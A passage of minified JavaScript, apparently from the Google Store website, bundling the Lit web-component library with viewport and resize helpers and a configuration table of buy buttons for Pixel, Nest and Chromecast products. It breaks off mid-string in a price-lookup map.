window.setTimeout((()=>{i&&i(t,{isIntersecting:!0,isVisible:!0},(()=>{})),a.resolve()})),{observer:null,dispose:()=>{},state:()=>({ready:!0,inview:!0}),readyPromise:a.getPromise()};let h=()=>{c&&c.unobserve(t),c&&c.disconnect(),r=[],n=null},c=new IntersectionObserver((e=>{e.length>=1&&(r=e,n=e.slice(-1)[0],s=n.isIntersecting,o=!0,a.resolve()),i&&i(t,e.slice(-1)[0],h)}),e);return c.observe(t),{observer:c,dispose:h,state:()=>({changes:r,lastChange:n,inview:s,ready:o}),readyPromise:a.getPromise()}}}})),Yy,WM,UM,HM,ma,cc=Ge((()=>{Yy=window.location.host.includes("google."),WM=window.location.host.includes("store.google."),UM=Yy&&"/template"===window.location.pathname,HM=window.location.pathname.includes("/intl/")||window.location.pathname.includes("/ideas/"),ma=Yy&&!UM&&!HM}));function If(){return/Android/i.test(navigator.userAgent)}function GM(){return-1!==navigator.userAgent.toLowerCase().indexOf("macintosh")&&Boolean(navigator.maxTouchPoints)&&navigator.maxTouchPoints>2}function Pf(){return/iPhone|iPad|iPod/i.test(navigator.userAgent)||GM()}function Xy(){return Pf()||If()}var Of=Ge((()=>{cc()}));function zM(t,e){let i=0,r=e=>{let r=window.innerWidth;(!Xy()||i!==r)&&(t(e),i=r)};return window.addEventListener("resize",r,e),()=>{window.removeEventListener("resize",r)}}var Ar,vn=Ge((()=>{Of(),Ar=class{constructor(){this.watcherConfigs=[]}add(t){Array.isArray(t.on)?t.on.forEach((e=>{let i=Object.assign({},t);i.on=e,this.addSingleEvent(i)})):this.addSingleEvent(t)}addSingleEvent(t){if(!t.element)return;let e=e=>{t.runWhen?t.runWhen()&&t.callback(e):t.callback(e)};if(t.listener=e,"smartResize"===t.on)t.remover=zM(e,t.eventOptions||{});else if("resize"===t.on&&t.element!==window){let i=new ResizeObserver((t=>{e(t)}));i.observe(t.element),t.remover=()=>{i.unobserve(t.element)}}else if("mutation"===t.on){let i=new MutationObserver((t=>{e(t)}));i.observe(t.element,t.eventOptions),t.remover=()=>{i.disconnect()}}else t.element,MediaQueryList,t.element.addEventListener(t.on,e,t.eventOptions||{}),t.remover=()=>{t.element.removeEventListener(t.on,e,t.eventOptions||{})};this.watcherConfigs.push(t)}removeById(t){this.watcherConfigs=this.watcherConfigs.filter((e=>{if(e.id&&e.id===t){let t=e.remover;return t&&t(),!1}return e}))}removeAll(){this.watcherConfigs.forEach((t=>{let e=t.remover;e&&e()})),this.watcherConfigs=[]}run(t){this.watcherConfigs.filter((e=>e.id&&e.id===t)).forEach((t=>{t.callback()&&t.callback()}))}dispose(){this.removeAll()}}}));function ga(t,e,i){let r=t=>{let e=(t=t||window.event).target||t.srcElement;e=3===e.nodeType?e.parentNode:e;do{i(e,t),e.parentNode&&(e=e.parentNode)}while(e.parentNode)};return t.addEventListener(e,r),()=>{t.removeEventListener(e,r)}}function Rf(t){return Array.from(t.querySelectorAll('button, [href], input, select, textarea, [tabindex]:not([tabindex="-1"])'))}function Qy(t,e){for(let i in e)t.style.setProperty(i,String(e[i]))}var va=Ge((()=>{})),uc,hc,Mf,Ky,fc,dc,ya,$f,pc,Lf=Ge((()=>{uc=window,hc=uc.ShadowRoot&&(void 0===uc.ShadyCSS||uc.ShadyCSS.nativeShadow)&&"adoptedStyleSheets"in Document.prototype&&"replace"in CSSStyleSheet.prototype,Mf=Symbol(),Ky=new WeakMap,fc=class{constructor(t,e,i){if(this._$cssResult$=!0,i!==Mf)throw Error("CSSResult is not constructable. Use `unsafeCSS` or `css` instead.");this.cssText=t,this.t=e}get styleSheet(){let t=this.o,e=this.t;if(hc&&void 0===t){let i=void 0!==e&&1===e.length;i&&(t=Ky.get(e)),void 0===t&&((this.o=t=new CSSStyleSheet).replaceSync(this.cssText),i&&Ky.set(e,t))}return t}toString(){return this.cssText}},dc=t=>new fc("string"==typeof t?t:t+"",void 0,Mf),ya=(t,...e)=>{let i=1===t.length?t[0]:e.reduce(((e,i,r)=>e+(t=>{if(!0===t._$cssResult$)return t.cssText;if("number"==typeof t)return t;throw Error("Value passed to 'css' function must be a 'css' function result: "+t+". Use 'unsafeCSS' to pass non-literal values, but take care to ensure page security.")})(i)+t[r+1]),t[0]);return new fc(i,t,Mf)},$f=(t,e)=>{hc?t.adoptedStyleSheets=e.map((t=>t instanceof CSSStyleSheet?t:t.styleSheet)):e.forEach((e=>{let i=document.createElement("style"),r=uc.litNonce;void 0!==r&&i.setAttribute("nonce",r),i.textContent=e.cssText,t.appendChild(i)}))},pc=hc?t=>t:t=>t instanceof CSSStyleSheet?(t=>{let e="";for(let i of t.cssRules)e+=i.cssText;return dc(e)})(t):t})),Df,mc,Zy,jM,Jy,kf,e_,Ff,Nf,Fn,gc=Ge((()=>{Lf(),Lf(),mc=window,Zy=mc.trustedTypes,jM=Zy?Zy.emptyScript:"",Jy=mc.reactiveElementPolyfillSupport,kf={toAttribute(t,e){switch(e){case Boolean:t=t?jM:null;break;case Object:case Array:t=null==t?t:JSON.stringify(t)}return t},fromAttribute(t,e){let i=t;switch(e){case Boolean:i=null!==t;break;case Number:i=null===t?null:Number(t);break;case Object:case Array:try{i=JSON.parse(t)}catch(t){i=null}}return i}},e_=(t,e)=>e!==t&&(e==e||t==t),Ff={attribute:!0,type:String,converter:kf,reflect:!1,hasChanged:e_},Nf="finalized",(Fn=class extends HTMLElement{constructor(){super(),this._$Ei=new Map,this.isUpdatePending=!1,this.hasUpdated=!1,this._$El=null,this.u()}static addInitializer(t){var e;this.finalize(),(null!==(e=this.h)&&void 0!==e?e:this.h=[]).push(t)}static get observedAttributes(){this.finalize();let t=[];return this.elementProperties.forEach(((e,i)=>{let r=this._$Ep(i,e);void 0!==r&&(this._$Ev.set(r,i),t.push(r))})),t}static createProperty(t,e=Ff){if(e.state&&(e.attribute=!1),this.finalize(),this.elementProperties.set(t,e),!e.noAccessor&&!this.prototype.hasOwnProperty(t)){let i="symbol"==typeof t?Symbol():"__"+t,r=this.getPropertyDescriptor(t,i,e);void 0!==r&&Object.defineProperty(this.prototype,t,r)}}static getPropertyDescriptor(t,e,i){return{get(){return this[e]},set(r){let n=this[t];this[e]=r,this.requestUpdate(t,n,i)},configurable:!0,enumerable:!0}}static getPropertyOptions(t){return this.elementProperties.get(t)||Ff}static finalize(){if(this.hasOwnProperty(Nf))return!1;this[Nf]=!0;let t=Object.getPrototypeOf(this);if(t.finalize(),void 0!==t.h&&(this.h=[...t.h]),this.elementProperties=new Map(t.elementProperties),this._$Ev=new Map,this.hasOwnProperty("properties")){let t=this.properties,e=[...Object.getOwnPropertyNames(t),...Object.getOwnPropertySymbols(t)];for(let i of e)this.createProperty(i,t[i])}return this.elementStyles=this.finalizeStyles(this.styles),!0}static finalizeStyles(t){let e=[];if(Array.isArray(t)){let i=new Set(t.flat(1/0).reverse());for(let t of i)e.unshift(pc(t))}else void 0!==t&&e.push(pc(t));return e}static _$Ep(t,e){let i=e.attribute;return!1===i?void 0:"string"==typeof i?i:"string"==typeof t?t.toLowerCase():void 0}u(){var t;this._$E_=new Promise((t=>this.enableUpdating=t)),this._$AL=new Map,this._$Eg(),this.requestUpdate(),null===(t=this.constructor.h)||void 0===t||t.forEach((t=>t(this)))}addController(t){var e,i;(null!==(e=this._$ES)&&void 0!==e?e:this._$ES=[]).push(t),void 0!==this.renderRoot&&this.isConnected&&(null===(i=t.hostConnected)||void 0===i||i.call(t))}removeController(t){var e;null===(e=this._$ES)||void 0===e||e.splice(this._$ES.indexOf(t)>>>0,1)}_$Eg(){this.constructor.elementProperties.forEach(((t,e)=>{this.hasOwnProperty(e)&&(this._$Ei.set(e,this[e]),delete this[e])}))}createRenderRoot(){var t;let e=null!==(t=this.shadowRoot)&&void 0!==t?t:this.attachShadow(this.constructor.shadowRootOptions);return $f(e,this.constructor.elementStyles),e}connectedCallback(){var t;void 0===this.renderRoot&&(this.renderRoot=this.createRenderRoot()),this.enableUpdating(!0),null===(t=this._$ES)||void 0===t||t.forEach((t=>{var e;return null===(e=t.hostConnected)||void 0===e?void 0:e.call(t)}))}enableUpdating(t){}disconnectedCallback(){var t;null===(t=this._$ES)||void 0===t||t.forEach((t=>{var e;return null===(e=t.hostDisconnected)||void 0===e?void 0:e.call(t)}))}attributeChangedCallback(t,e,i){this._$AK(t,i)}_$EO(t,e,i=Ff){var r;let n=this.constructor._$Ep(t,i);if(void 0!==n&&!0===i.reflect){let s=(void 0!==(null===(r=i.converter)||void 0===r?void 0:r.toAttribute)?i.converter:kf).toAttribute(e,i.type);this._$El=t,null==s?this.removeAttribute(n):this.setAttribute(n,s),this._$El=null}}_$AK(t,e){var i;let r=this.constructor,n=r._$Ev.get(t);if(void 0!==n&&this._$El!==n){let t=r.getPropertyOptions(n),s="function"==typeof t.converter?{fromAttribute:t.converter}:void 0!==(null===(i=t.converter)||void 0===i?void 0:i.fromAttribute)?t.converter:kf;this._$El=n,this[n]=s.fromAttribute(e,t.type),this._$El=null}}requestUpdate(t,e,i){let r=!0;void 0!==t&&(((i=i||this.constructor.getPropertyOptions(t)).hasChanged||e_)(this[t],e)?(this._$AL.has(t)||this._$AL.set(t,e),!0===i.reflect&&this._$El!==t&&(void 0===this._$EC&&(this._$EC=new Map),this._$EC.set(t,i))):r=!1),!this.isUpdatePending&&r&&(this._$E_=this._$Ej())}async _$Ej(){this.isUpdatePending=!0;try{await this._$E_}catch(t){Promise.reject(t)}let t=this.scheduleUpdate();return null!=t&&await t,!this.isUpdatePending}scheduleUpdate(){return this.performUpdate()}performUpdate(){var t;if(!this.isUpdatePending)return;this.hasUpdated,this._$Ei&&(this._$Ei.forEach(((t,e)=>this[e]=t)),this._$Ei=void 0);let e=!1,i=this._$AL;try{e=this.shouldUpdate(i),e?(this.willUpdate(i),null===(t=this._$ES)||void 0===t||t.forEach((t=>{var e;return null===(e=t.hostUpdate)||void 0===e?void 0:e.call(t)})),this.update(i)):this._$Ek()}catch(t){throw e=!1,this._$Ek(),t}e&&this._$AE(i)}willUpdate(t){}_$AE(t){var e;null===(e=this._$ES)||void 0===e||e.forEach((t=>{var e;return null===(e=t.hostUpdated)||void 0===e?void 0:e.call(t)})),this.hasUpdated||(this.hasUpdated=!0,this.firstUpdated(t)),this.updated(t)}_$Ek(){this._$AL=new Map,this.isUpdatePending=!1}get updateComplete(){return this.getUpdateComplete()}getUpdateComplete(){return this._$E_}shouldUpdate(t){return!0}update(t){void 0!==this._$EC&&(this._$EC.forEach(((t,e)=>this._$EO(e,this[e],t))),this._$EC=void 0),this._$Ek()}updated(t){}firstUpdated(t){}})[Nf]=!0,Fn.elementProperties=new Map,Fn.elementStyles=[],Fn.shadowRootOptions={mode:"open"},null==Jy||Jy({ReactiveElement:Fn}),(null!==(Df=mc.reactiveElementVersions)&&void 0!==Df?Df:mc.reactiveElementVersions=[]).push("1.6.2")}));function no(t,e,i=t,r){var n,s,o,a;if(e===gs)return e;let l=void 0!==r?null===(n=i._$Co)||void 0===n?void 0:n[r]:i._$Cl,h=ba(e)?void 0:e._$litDirective$;return(null==l?void 0:l.constructor)!==h&&(null===(s=null==l?void 0:l._$AO)||void 0===s||s.call(l,!1),void 0===h?l=void 0:(l=new h(t),l._$AT(t,i,r)),void 0!==r?(null!==(o=(a=i)._$Co)&&void 0!==o?o:a._$Co=[])[r]=l:i._$Cl=l),void 0!==l&&(e=no(t,l._$AS(t,e.values),l,r)),e}var Vf,vc,ro,t_,qf,Nn,r_,YM,ps,_a,ba,i_,XM,Bf,wa,n_,s_,ms,o_,a_,l_,c_,Vn,mW,gs,fr,u_,vs,QM,io,h_,so,Ea,f_,KM,d_,p_,m_,g_,v_,Sa=Ge((()=>{vc=window,ro=vc.trustedTypes,t_=ro?ro.createPolicy("lit-html",{createHTML:t=>t}):void 0,qf="$lit$",Nn=`lit$${(Math.random()+"").slice(9)}$`,YM=`<${r_="?"+Nn}>`,ps=document,_a=()=>ps.createComment(""),ba=t=>null===t||"object"!=typeof t&&"function"!=typeof t,i_=Array.isArray,XM=t=>i_(t)||"function"==typeof(null==t?void 0:t[Symbol.iterator]),Bf="[ \t\n\f\r]",wa=/<(?:(!--|\/[^a-zA-Z])|(\/?[a-zA-Z][^>\s]*)|(\/?$))/g,n_=/-->/g,s_=/>/g,ms=RegExp(`>|${Bf}(?:([^\\s"'>=/]+)(${Bf}*=${Bf}*(?:[^ \t\n\f\r"'\`<>=]|("|')|))|$)`,"g"),o_=/'/g,a_=/"/g,l_=/^(?:script|style|textarea|title)$/i,Vn=(c_=t=>(e,...i)=>({_$litType$:t,strings:e,values:i}))(1),mW=c_(2),gs=Symbol.for("lit-noChange"),fr=Symbol.for("lit-nothing"),u_=new WeakMap,vs=ps.createTreeWalker(ps,129,null,!1),QM=(t,e)=>{let i,r=t.length-1,n=[],s=2===e?"<svg>":"",o=wa;for(let e=0;e<r;e++){let r,a,l=t[e],h=-1,c=0;for(;c<l.length&&(o.lastIndex=c,a=o.exec(l),null!==a);)c=o.lastIndex,o===wa?"!--"===a[1]?o=n_:void 0!==a[1]?o=s_:void 0!==a[2]?(l_.test(a[2])&&(i=RegExp("</"+a[2],"g")),o=ms):void 0!==a[3]&&(o=ms):o===ms?">"===a[0]?(o=i??wa,h=-1):void 0===a[1]?h=-2:(h=o.lastIndex-a[2].length,r=a[1],o=void 0===a[3]?ms:'"'===a[3]?a_:o_):o===a_||o===o_?o=ms:o===n_||o===s_?o=wa:(o=ms,i=void 0);let u=o===ms&&t[e+1].startsWith("/>")?" ":"";s+=o===wa?l+YM:h>=0?(n.push(r),l.slice(0,h)+qf+l.slice(h)+Nn+u):l+Nn+(-2===h?(n.push(void 0),e):u)}let a=s+(t[r]||"<?>")+(2===e?"</svg>":"");if(!Array.isArray(t)||!t.hasOwnProperty("raw"))throw Error("invalid template strings array");return[void 0!==t_?t_.createHTML(a):a,n]},io=class{constructor({strings:t,_$litType$:e},i){let r;this.parts=[];let n=0,s=0,o=t.length-1,a=this.parts,[l,h]=QM(t,e);if(this.el=io.createElement(l,i),vs.currentNode=this.el.content,2===e){let t=this.el.content,e=t.firstChild;e.remove(),t.append(...e.childNodes)}for(;null!==(r=vs.nextNode())&&a.length<o;){if(1===r.nodeType){if(r.hasAttributes()){let t=[];for(let e of r.getAttributeNames())if(e.endsWith(qf)||e.startsWith(Nn)){let i=h[s++];if(t.push(e),void 0!==i){let t=r.getAttribute(i.toLowerCase()+qf).split(Nn),e=/([.?@])?(.*)/.exec(i);a.push({type:1,index:n,name:e[2],strings:t,ctor:"."===e[1]?f_:"?"===e[1]?d_:"@"===e[1]?p_:Ea})}else a.push({type:6,index:n})}for(let e of t)r.removeAttribute(e)}if(l_.test(r.tagName)){let t=r.textContent.split(Nn),e=t.length-1;if(e>0){r.textContent=ro?ro.emptyScript:"";for(let i=0;i<e;i++)r.append(t[i],_a()),vs.nextNode(),a.push({type:2,index:++n});r.append(t[e],_a())}}}else if(8===r.nodeType)if(r.data===r_)a.push({type:2,index:n});else{let t=-1;for(;-1!==(t=r.data.indexOf(Nn,t+1));)a.push({type:7,index:n}),t+=Nn.length-1}n++}}static createElement(t,e){let i=ps.createElement("template");return i.innerHTML=t,i}},h_=class{constructor(t,e){this._$AV=[],this._$AN=void 0,this._$AD=t,this._$AM=e}get parentNode(){return this._$AM.parentNode}get _$AU(){return this._$AM._$AU}u(t){var e;let{el:{content:i},parts:r}=this._$AD,n=(null!==(e=null==t?void 0:t.creationScope)&&void 0!==e?e:ps).importNode(i,!0);vs.currentNode=n;let s=vs.nextNode(),o=0,a=0,l=r[0];for(;void 0!==l;){if(o===l.index){let e;2===l.type?e=new so(s,s.nextSibling,this,t):1===l.type?e=new l.ctor(s,l.name,l.strings,this,t):6===l.type&&(e=new m_(s,this,t)),this._$AV.push(e),l=r[++a]}o!==(null==l?void 0:l.index)&&(s=vs.nextNode(),o++)}return vs.currentNode=ps,n}v(t){let e=0;for(let i of this._$AV)void 0!==i&&(void 0!==i.strings?(i._$AI(t,i,e),e+=i.strings.length-2):i._$AI(t[e])),e++}},so=class{constructor(t,e,i,r){var n;this.type=2,this._$AH=fr,this._$AN=void 0,this._$AA=t,this._$AB=e,this._$AM=i,this.options=r,this._$Cp=null===(n=null==r?void 0:r.isConnected)||void 0===n||n}get _$AU(){var t,e;return null!==(e=null===(t=this._$AM)||void 0===t?void 0:t._$AU)&&void 0!==e?e:this._$Cp}get parentNode(){let t=this._$AA.parentNode,e=this._$AM;return void 0!==e&&11===(null==t?void 0:t.nodeType)&&(t=e.parentNode),t}get startNode(){return this._$AA}get endNode(){return this._$AB}_$AI(t,e=this){t=no(this,t,e),ba(t)?t===fr||null==t||""===t?(this._$AH!==fr&&this._$AR(),this._$AH=fr):t!==this._$AH&&t!==gs&&this._(t):void 0!==t._$litType$?this.g(t):void 0!==t.nodeType?this.$(t):XM(t)?this.T(t):this._(t)}k(t){return this._$AA.parentNode.insertBefore(t,this._$AB)}$(t){this._$AH!==t&&(this._$AR(),this._$AH=this.k(t))}_(t){this._$AH!==fr&&ba(this._$AH)?this._$AA.nextSibling.data=t:this.$(ps.createTextNode(t)),this._$AH=t}g(t){var e;let{values:i,_$litType$:r}=t,n="number"==typeof r?this._$AC(t):(void 0===r.el&&(r.el=io.createElement(r.h,this.options)),r);if((null===(e=this._$AH)||void 0===e?void 0:e._$AD)===n)this._$AH.v(i);else{let t=new h_(n,this),e=t.u(this.options);t.v(i),this.$(e),this._$AH=t}}_$AC(t){let e=u_.get(t.strings);return void 0===e&&u_.set(t.strings,e=new io(t)),e}T(t){i_(this._$AH)||(this._$AH=[],this._$AR());let e,i=this._$AH,r=0;for(let n of t)r===i.length?i.push(e=new so(this.k(_a()),this.k(_a()),this,this.options)):e=i[r],e._$AI(n),r++;r<i.length&&(this._$AR(e&&e._$AB.nextSibling,r),i.length=r)}_$AR(t=this._$AA.nextSibling,e){var i;for(null===(i=this._$AP)||void 0===i||i.call(this,!1,!0,e);t&&t!==this._$AB;){let e=t.nextSibling;t.remove(),t=e}}setConnected(t){var e;void 0===this._$AM&&(this._$Cp=t,null===(e=this._$AP)||void 0===e||e.call(this,t))}},Ea=class{constructor(t,e,i,r,n){this.type=1,this._$AH=fr,this._$AN=void 0,this.element=t,this.name=e,this._$AM=r,this.options=n,i.length>2||""!==i[0]||""!==i[1]?(this._$AH=Array(i.length-1).fill(new String),this.strings=i):this._$AH=fr}get tagName(){return this.element.tagName}get _$AU(){return this._$AM._$AU}_$AI(t,e=this,i,r){let n=this.strings,s=!1;if(void 0===n)t=no(this,t,e,0),s=!ba(t)||t!==this._$AH&&t!==gs,s&&(this._$AH=t);else{let r,o,a=t;for(t=n[0],r=0;r<n.length-1;r++)o=no(this,a[i+r],e,r),o===gs&&(o=this._$AH[r]),s||(s=!ba(o)||o!==this._$AH[r]),o===fr?t=fr:t!==fr&&(t+=(o??"")+n[r+1]),this._$AH[r]=o}s&&!r&&this.j(t)}j(t){t===fr?this.element.removeAttribute(this.name):this.element.setAttribute(this.name,t??"")}},f_=class extends Ea{constructor(){super(...arguments),this.type=3}j(t){this.element[this.name]=t===fr?void 0:t}},KM=ro?ro.emptyScript:"",d_=class extends Ea{constructor(){super(...arguments),this.type=4}j(t){t&&t!==fr?this.element.setAttribute(this.name,KM):this.element.removeAttribute(this.name)}},p_=class extends Ea{constructor(t,e,i,r,n){super(t,e,i,r,n),this.type=5}_$AI(t,e=this){var i;if((t=null!==(i=no(this,t,e,0))&&void 0!==i?i:fr)===gs)return;let r=this._$AH,n=t===fr&&r!==fr||t.capture!==r.capture||t.once!==r.once||t.passive!==r.passive,s=t!==fr&&(r===fr||n);n&&this.element.removeEventListener(this.name,this,r),s&&this.element.addEventListener(this.name,this,t),this._$AH=t}handleEvent(t){var e,i;"function"==typeof this._$AH?this._$AH.call(null!==(i=null===(e=this.options)||void 0===e?void 0:e.host)&&void 0!==i?i:this.element,t):this._$AH.handleEvent(t)}},m_=class{constructor(t,e,i){this.element=t,this.type=6,this._$AN=void 0,this._$AM=e,this.options=i}get _$AU(){return this._$AM._$AU}_$AI(t){no(this,t)}},null==(g_=vc.litHtmlPolyfillSupport)||g_(io,so),(null!==(Vf=vc.litHtmlVersions)&&void 0!==Vf?Vf:vc.litHtmlVersions=[]).push("2.7.4"),v_=(t,e,i)=>{var r,n;let s=null!==(r=null==i?void 0:i.renderBefore)&&void 0!==r?r:e,o=s._$litPart$;if(void 0===o){let t=null!==(n=null==i?void 0:i.renderBefore)&&void 0!==n?n:null;s._$litPart$=o=new so(e.insertBefore(_a(),t),t,void 0,i??{})}return o._$AI(t),o}})),Wf,Uf,ei,y_,__=Ge((()=>{gc(),gc(),Sa(),Sa(),(ei=class extends Fn{constructor(){super(...arguments),this.renderOptions={host:this},this._$Do=void 0}createRenderRoot(){var t,e;let i=super.createRenderRoot();return null!==(t=(e=this.renderOptions).renderBefore)&&void 0!==t||(e.renderBefore=i.firstChild),i}update(t){let e=this.render();this.hasUpdated||(this.renderOptions.isConnected=this.isConnected),super.update(t),this._$Do=v_(e,this.renderRoot,this.renderOptions)}connectedCallback(){var t;super.connectedCallback(),null===(t=this._$Do)||void 0===t||t.setConnected(!0)}disconnectedCallback(){var t;super.disconnectedCallback(),null===(t=this._$Do)||void 0===t||t.setConnected(!1)}render(){return gs}}).finalized=!0,ei._$litElement$=!0,null===(Wf=globalThis.litElementHydrateSupport)||void 0===Wf||Wf.call(globalThis,{LitElement:ei}),null==(y_=globalThis.litElementPolyfillSupport)||y_({LitElement:ei}),(null!==(Uf=globalThis.litElementVersions)&&void 0!==Uf?Uf:globalThis.litElementVersions=[]).push("3.3.2")})),Aa=Ge((()=>{gc(),Sa(),__()})),b_,w_=Ge((()=>{b_=t=>e=>{return"function"==typeof e?(i=t,r=e,customElements.define(i,r),r):((t,e)=>{let{kind:i,elements:r}=e;return{kind:i,elements:r,finisher(e){customElements.define(t,e)}}})(t,e);var i,r}}));function Ur(t){return(e,i)=>void 0!==i?JM(t,e,i):ZM(t,e)}var ZM,JM,Hf=Ge((()=>{ZM=(t,e)=>"method"===e.kind&&e.descriptor&&!("value"in e.descriptor)?{...e,finisher(i){i.createProperty(e.key,t)}}:{kind:"field",key:Symbol(),placement:"own",descriptor:{},originalKey:e.key,initializer(){"function"==typeof e.initializer&&(this[e.key]=e.initializer.call(this))},finisher(i){i.createProperty(e.key,t)}},JM=(t,e,i)=>{e.constructor.createProperty(i,t)}})),E_=Ge((()=>{Hf()})),Li,yn=Ge((()=>{Li=({finisher:t,descriptor:e})=>(i,r)=>{var n;if(void 0===r){let r=null!==(n=i.originalKey)&&void 0!==n?n:i.key,s=null!=e?{kind:"method",placement:"prototype",key:r,descriptor:e(i.key)}:{...i,key:r};return null!=t&&(s.finisher=function(e){t(e,r)}),s}{let n=i.constructor;void 0!==e&&Object.defineProperty(i,r,e(r)),null==t||t(n,r)}}})),S_=Ge((()=>{yn()}));function qn(t,e){return Li({descriptor:i=>{let r={get(){var e,i;return null!==(i=null===(e=this.renderRoot)||void 0===e?void 0:e.querySelector(t))&&void 0!==i?i:null},enumerable:!0,configurable:!0};if(e){let e="symbol"==typeof i?Symbol():"__"+i;r.get=function(){var i,r;return void 0===this[e]&&(this[e]=null!==(r=null===(i=this.renderRoot)||void 0===i?void 0:i.querySelector(t))&&void 0!==r?r:null),this[e]}}return r}})}var A_=Ge((()=>{yn()})),C_=Ge((()=>{yn()})),T_=Ge((()=>{yn()})),Gf,qW,zf=Ge((()=>{yn(),qW=null!=(null===(Gf=window.HTMLSlotElement)||void 0===Gf?void 0:Gf.prototype.assignedElements)?(t,e)=>t.assignedElements(e):(t,e)=>t.assignedNodes(e).filter((t=>t.nodeType===Node.ELEMENT_NODE))})),x_=Ge((()=>{yn(),zf()})),ys=Ge((()=>{w_(),Hf(),E_(),S_(),A_(),C_(),T_(),zf(),x_()}));function yc(t){return e=>window.customElements.get(t)?e:b_(t)(e)}var jf=Ge((()=>{ys()})),Yf,I_=Ge((()=>{Yf={test:{url:"http://google.com",label:"Google",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:"_test",productName:"Test",productFamilyDocid:"test family",ariaLabel:"Test Aria Label"},test_disabled:{url:"http://google.com",label:"Google",source:null,imageUrl:null,behavior:"DISABLED",pageId:null,skuId:"_test",productName:"Test",productFamilyDocid:"test disabled family",ariaLabel:"Test Aria Label"},sample:{url:"http://google.com",label:"Google",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:"_sample",productName:"Test",productFamilyDocid:"sample family",ariaLabel:"Test Aria Label"},_sample_nosku:{url:"http://google.com",label:"Google",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:null,productName:"Test",productFamilyDocid:"sample nosku family",ariaLabel:"Test Aria Label"},_google_pixel_stand_white:{url:null,label:"Unavailable",source:null,imageUrl:null,behavior:"DISABLED",pageId:null,skuId:"_google_pixel_stand_white",productName:"Google Pixel Stand White",productFamilyDocid:"family",ariaLabel:""},chromecast_google_tv:{url:"/config/chromecast_google_tv",label:"Buy",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:null,productName:"Chromecast with Google TV",productFamilyDocid:"family",ariaLabel:"Buy Chromecast with Google TV"},nest_audio:{url:"/config/nest_audio",label:"Buy",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:null,productName:"Nest Audio",productFamilyDocid:"family",ariaLabel:"Buy Nest Audio"},nest_thermostat:{url:"/config/nest_thermostat",label:"Buy",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:null,productName:"Nest Thermostat",productFamilyDocid:"family",ariaLabel:"Buy Nest Thermostat"},nest_thermostat_e:{url:null,label:"Buy",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:null,productName:"Nest Thermostat E",productFamilyDocid:"family",ariaLabel:""},pixel_4:{url:"/config/pixel_4",label:"Buy",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:null,productName:"Google Pixel 4",productFamilyDocid:"_pixel_phone_4_fam",ariaLabel:"Buy Google Pixel 4"},pixel_4a_5g:{url:null,label:"No longer available",source:null,imageUrl:null,behavior:"DISABLED",pageId:null,skuId:null,productName:"Google Pixel 4a with 5G",productFamilyDocid:"_pixel_phone_4_fam",ariaLabel:""},pixel_4a_5g_case_fabric:{url:"/config/pixel_4a_5g_case_fabric",label:"Buy",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:null,productName:"Google Pixel 4a (5G) Case",productFamilyDocid:"_pixel_phone_4_fam",ariaLabel:"Buy Google Pixel 4a (5G) Case"},pixel_6:{ariaLabel:"Buy Pixel 6",behavior:"REDIRECT",imageUrl:null,label:"Buy",pageId:null,productName:"Pixel 6",productFamilyDocid:"_pixel_phone_6_fam",skuId:null,source:null,url:"/config/pixel_6"},pixel_6a:{ariaLabel:"Buy Pixel 6a",behavior:"REDIRECT",imageUrl:null,label:"Buy",pageId:null,productName:"Pixel 6a",productFamilyDocid:"_pixel_phone_6_fam",skuId:null,source:null,url:"/config/pixel_6a"},pixel_5:{url:null,label:"No longer available",source:null,imageUrl:null,behavior:"DISABLED",pageId:null,skuId:null,productName:"Google Pixel 5",productFamilyDocid:"_pixel_phone_5_fam",ariaLabel:""},pixel_5_case_fabric:{url:"/config/pixel_5_case_fabric",label:"Buy",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:null,productName:"Google Pixel 5 Case",productFamilyDocid:"_pixel_phone_5_fam",ariaLabel:"Buy Google Pixel 5 Case"},pixel_pass:{url:"#compare",label:"Subscribe ",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:null,productName:"Pixel Pass",productFamilyDocid:"_pixel_pass_fam",ariaLabel:"Subscribe  Pixel Pass"},stadia:{url:"/product/gaming_entertainment_package",label:"Buy now",source:null,imageUrl:null,behavior:"REDIRECT",pageId:null,skuId:null,productName:"Stadia Overview",productFamilyDocid:"_stadia_fam",ariaLabel:"Buy Stadia Overview"},google_pixel_watch:{url:"/config/google_pixel_watch",source:null,imageUrl:null,pageId:null,skuId:null,label:"購入",behavior:"REDIRECT",productName:"Google Pixel Watch",ariaLabel:"購入 Google Pixel Watch",productFamilyDocid:"_google_pixel_watch_fam"},example_waitlist:{url:null,label:"Join waitlist",source:null,imageUrl:null,behavior:"JOIN_WAITLIST",pageId:null,skuId:null,productName:"Example Overview",productFamilyDocid:"_example_fam",ariaLabel:"Join waitlist for Example"},example_sign_in_and_join_waitlist:{url:null,label:"Sign in to join waitlist",source:null,imageUrl:null,behavior:"SIGN_IN_AND_JOIN_WAITLIST",pageId:null,skuId:null,productName:"Example Overview",productFamilyDocid:"_example_fam",ariaLabel:"Sign in to join waitlist for Example"},usb_c_earbuds:{url:null,label:"Add to cart",source:null,imageUrl:null,behavior:"ADD_TO_CART",pageId:null,skuId:"_pixel_usb_c_earbuds_white",productName:"Google Pixel USB-C™ earbuds",productFamilyDocid:"_example_fam",ariaLabel:"Add Google Pixel USB-C™ earbuds to cart"},sunfish:{ariaLabel:"",behavior:"DISABLED",imageUrl:null,label:"Out of stock",pageId:null,productName:"sunfish overview",productFamilyDocid:"_example_fam",skuId:null,source:null,url:null},flame:{ariaLabel:"",behavior:"DISABLED",imageUrl:null,label:"Out of stock",pageId:null,productName:"sunfish overview",productFamilyDocid:"_example_fam",skuId:null,source:null,url:null}}})),P_,O_=Ge((()=>{P_={_pixel_usb_c_earbuds_white:new Promise((t=>t(void 0)))}})),R_,M_=Ge((()=>{R_={'[[{"docid":"_google_home_mini_chalk","quantity":1},{"docid":"_nest_learning_thermostat_3rd_gen","quantity":1}],"+"]':new Promise((t=>t({html:'<span class="jZS2Hf" data-test-is-price="">From CA$329</span>',financingHtml:"",ariaLabel:"Starting from 